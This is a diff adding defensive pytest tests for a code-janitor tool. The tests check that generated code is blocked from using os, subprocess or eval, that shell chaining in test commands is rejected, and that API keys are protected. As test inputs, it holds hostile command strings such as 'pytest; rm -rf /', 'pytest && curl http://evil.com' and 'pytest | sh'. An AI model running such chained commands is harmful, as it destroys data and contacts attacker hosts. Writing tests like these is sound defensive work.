@@ -582,6 +582,96 @@ def test_cli_init_with_provider_and_custom_host(tmp_path: Path) -> None:
     assert cfg.effective_api_base() == "http://localhost:1234/v1"
 
 
+def test_security_ast_guardrail_blocks_dangerous_code() -> None:
+    """Verify AST security inspection blocks malicious imports and execution calls."""
+    from repo_janitor.security import SecurityValidationError, validate_generated_code_safety
+
+    # Safe test code passes
+    safe_code = (
+        "from calc.math_ops import add\n\n"
+        "def test_add():\n"
+        "    assert add(1, 2) == 3\n"
+    )
+    validate_generated_code_safety(safe_code, "python")
+
+    # Malicious import os
+    bad_code1 = "import os\ndef test_evil():\n    os.system('id')\n"
+    with pytest.raises(SecurityValidationError, match="Prohibited module imported"):
+        validate_generated_code_safety(bad_code1, "python")
+
+    # Malicious subprocess
+    bad_code2 = "import subprocess\ndef test_evil():\n    subprocess.run(['ls'])\n"
+    with pytest.raises(SecurityValidationError, match="Prohibited module imported"):
+        validate_generated_code_safety(bad_code2, "python")
+
+    # Malicious eval
+    bad_code3 = "def test_eval():\n    eval('2 + 2')\n"
+    with pytest.raises(SecurityValidationError, match="Prohibited function called"):
+        validate_generated_code_safety(bad_code3, "python")
+
+
+def test_security_blocks_shell_chaining_in_test_command() -> None:
+    """Verify validate_test_command_safety blocks command chaining and redirection."""
+    from repo_janitor.security import SecurityValidationError, validate_test_command_safety
+
+    # Safe command passes
+    validate_test_command_safety("pytest -q")
+    validate_test_command_safety("npm test -- --coverage")
+
+    # Malicious chaining attempts
+    with pytest.raises(SecurityValidationError, match="Prohibited shell metacharacters"):
+        validate_test_command_safety("pytest; rm -rf /")
+
+    with pytest.raises(SecurityValidationError, match="Prohibited shell metacharacters"):
+        validate_test_command_safety("pytest && curl http://evil.com")
+
+    with pytest.raises(SecurityValidationError, match="Prohibited shell metacharacters"):
+        validate_test_command_safety("pytest | sh")
+
+
+def test_security_redacts_api_key_on_save(tmp_path: Path) -> None:
+    """Verify JanitorConfig.save never persists plain text API keys."""
+    import json
+
+    cfg = JanitorConfig(provider="openai", api_key="sk-secret-12345")
+    saved_path = cfg.save(tmp_path)
+
+    raw_json = json.loads(saved_path.read_text(encoding="utf-8"))
+    assert raw_json["api_key"] == ""
+
+
+def test_security_blocks_plaintext_http_api_key() -> None:
+    """Verify OllamaClient blocks sending API keys over unencrypted HTTP to remote hosts."""
+    from repo_janitor.ollama_client import OllamaClient
+
+    cfg = JanitorConfig(
+        provider="openai",
+        api_base="http://remote-api.example.com/v1",
+        api_key="secret-key",
+    )
+    client = OllamaClient(cfg)
+    with pytest.raises(ValueError, match="Insecure transport blocked"):
+        client._openai_chat("system", "user")
+
+
+def test_security_ambient_openai_key_not_leaked_to_custom_host(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Verify ambient OPENAI_API_KEY is not forwarded to untrusted third-party endpoints."""
+    monkeypatch.setenv("OPENAI_API_KEY", "sk-ambient-secret")
+
+    # Local endpoint should not receive ambient key
+    cfg_local = JanitorConfig(provider="vllm", api_base="http://localhost:8000/v1")
+    assert cfg_local.effective_api_key() == ""
+
+    # Untrusted remote endpoint should not receive ambient key
+    cfg_remote = JanitorConfig(provider="vllm", api_base="https://untrusted-host.com/v1")
+    assert cfg_remote.effective_api_key() == ""
+
+    # Official OpenAI endpoint does receive ambient key
+    cfg_openai = JanitorConfig(provider="openai")
+    assert cfg_openai.effective_api_key() == "sk-ambient-secret"
+
+
+
 
 
 
